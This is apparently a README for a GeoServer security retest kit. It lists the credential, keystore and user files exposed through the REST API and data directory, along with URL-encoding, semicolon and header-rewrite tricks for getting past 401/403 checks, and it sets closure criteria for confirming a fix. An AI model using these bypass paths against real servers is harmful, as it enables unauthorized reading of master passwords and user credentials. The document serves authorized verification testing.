# GeoServer REST Sensitive Paths and Bypass Usage

Generated files:

```text
geoserver_sensitive_base_paths.txt
  518 base GeoServer paths.

geoserver_sensitive_path_bypass_wordlist.txt
  17,425 expanded URL/path variants.

geoserver_sensitive_critical_bypass_wordlist.txt
  3,472 expanded variants for the highest-value sensitive files.

geoserver_403_401_header_bypass_templates.txt
  Header bypass templates. Replace {PATH} with the target path.

geoserver_safe_method_templates.txt
  Safe method templates: GET, HEAD, OPTIONS.
```

## How to Use

Start with:

```text
geoserver_sensitive_critical_bypass_wordlist.txt
```

If that is clean, run:

```text
geoserver_sensitive_base_paths.txt
geoserver_sensitive_path_bypass_wordlist.txt
```

Replace placeholders before testing:

```text
WORKSPACE      -> known workspace name
LAYER          -> known layer name, usually workspace:layer
LAYERGROUP     -> known layer group
STYLE          -> known style name
DATASTORE      -> known datastore
FEATURETYPE    -> known feature type
COVERAGESTORE  -> known coverage store
COVERAGE       -> known coverage
WMSSTORE       -> known WMS store
WMSLAYER       -> known WMS layer
WMTSSTORE      -> known WMTS store
WMTSLAYER      -> known WMTS layer
```

If you do not know names yet, enumerate safely with:

```text
/geoserver/rest/workspaces.xml
/geoserver/rest/layers.xml
/geoserver/rest/styles.xml
/geoserver/rest/layergroups.xml
/geoserver/wms?service=WMS&request=GetCapabilities
/geoserver/wfs?service=WFS&request=GetCapabilities
```

## Highest-Value REST Resource Paths

These are the most important ones to prove closed:

```text
/geoserver/rest/resource/security/masterpw.info
/geoserver/rest/resource/security/masterpw/default/passwd
/geoserver/rest/resource/security/masterpw/default/config.xml
/geoserver/rest/resource/security/geoserver.jceks
/geoserver/rest/resource/security/usergroup/default/users.xml
/geoserver/rest/resource/security/usergroup/default/users.properties
/geoserver/rest/resource/security/role/default/roles.xml
/geoserver/rest/resource/security/role/default/roles.properties
/geoserver/rest/resource/security/rest.properties
/geoserver/rest/resource/security/layers.properties
/geoserver/rest/resource/security/services.properties
/geoserver/rest/resource/logs/geoserver.log
/geoserver/rest/resource/workspaces/WORKSPACE/DATASTORE/datastore.xml
/geoserver/rest/resource/workspaces/WORKSPACE/DATASTORE/FEATURETYPE/featuretype.xml
/geoserver/rest/resource/workspaces/WORKSPACE/DATASTORE/FEATURETYPE/layer.xml
/geoserver/rest/resource/workspaces/WORKSPACE/COVERAGESTORE/coveragestore.xml
/geoserver/rest/resource/workspaces/WORKSPACE/COVERAGESTORE/COVERAGE/coverage.xml
/geoserver/rest/resource/gwc/geowebcache.xml
/geoserver/rest/resource/tomcat_passwd
/geoserver/rest/resource/tomcat-users.xml
```

## Direct Web Server Exposure Paths

These are separate from the REST issue:

```text
/geoserver/data/security/masterpw.info
/geoserver/data/security/masterpw/default/passwd
/geoserver/data/security/geoserver.jceks
/geoserver/data/security/usergroup/default/users.xml
/geoserver/data/security/role/default/roles.xml
/geoserver/data_dir/security/masterpw.info
/geoserver/data_dir/security/masterpw/default/passwd
/geoserver/data_dir/security/geoserver.jceks
/data_dir/security/masterpw.info
/data_dir/security/masterpw/default/passwd
/WEB-INF/web.xml
/geoserver/WEB-INF/web.xml
/geoserver/META-INF/MANIFEST.MF
```

## Path Bypass Types Applied

The expanded wordlist applies these patterns to every base path:

```text
original path
trailing slash
trailing dot
semicolon path parameter
;jsessionid=
uppercase path
lowercase path
double slash
encoded leading dot: /%2e/path
double-encoded leading dot: /%252e/path
unicode slash-like prefix: /%ef%bc%8fpath
semicolon prefix: /;/path
dot-semicolon prefix: /.;/path
//;// prefix
inserted /./ after /geoserver
inserted /;/ after /geoserver
inserted /%2e/ after /geoserver
inserted /./ after /rest
inserted /;/ after /rest
inserted /%2e/ after /rest
encoded slashes: %2f
double-encoded slashes: %252f
encoded backslashes: %5c
trailing %2f
trailing %252f
trailing %20
trailing %09
extra query strings
.html/.xml/.json/.txt suffixes where useful
operation=metadata variants for /rest/resource
```

## Header Bypass Mode

Header bypass is not a URL wordlist. Test it as separate Burp requests.

Mode 1: request the protected path and add one header at a time:

```http
GET /geoserver/rest/resource/security/masterpw.info HTTP/1.1
Host: target.example
X-Forwarded-For: 127.0.0.1
```

Mode 2: request `/` or a harmless allowed path and rewrite to the protected path:

```http
GET / HTTP/1.1
Host: target.example
X-Original-URL: /geoserver/rest/resource/security/masterpw.info
```

Also test:

```http
X-Rewrite-URL: /geoserver/rest/resource/security/masterpw.info
X-Forwarded-Path: /geoserver/rest/resource/security/masterpw.info
```

## Method Mode

Use these globally:

```text
GET
HEAD
OPTIONS
```

Do not globally fuzz `PUT`, `POST`, `PATCH`, or `DELETE` against REST endpoints unless the retest rules explicitly allow state-changing requests. GeoServer REST uses write methods for configuration changes.

## Closure Rule

For the REST API exposure issue, call it fixed only if:

```text
unauthenticated base paths fail safely,
unauthenticated bypass variants fail safely,
low-privileged base paths fail safely,
low-privileged bypass variants fail safely,
header rewrite attempts fail safely,
no directory listing is returned,
no XML/properties/log/JCEKS file content is returned.
```

Expected safe outcomes:

```text
401
403
safe 404
405 for unsupported method without sensitive content
generic login page without leaked config
```
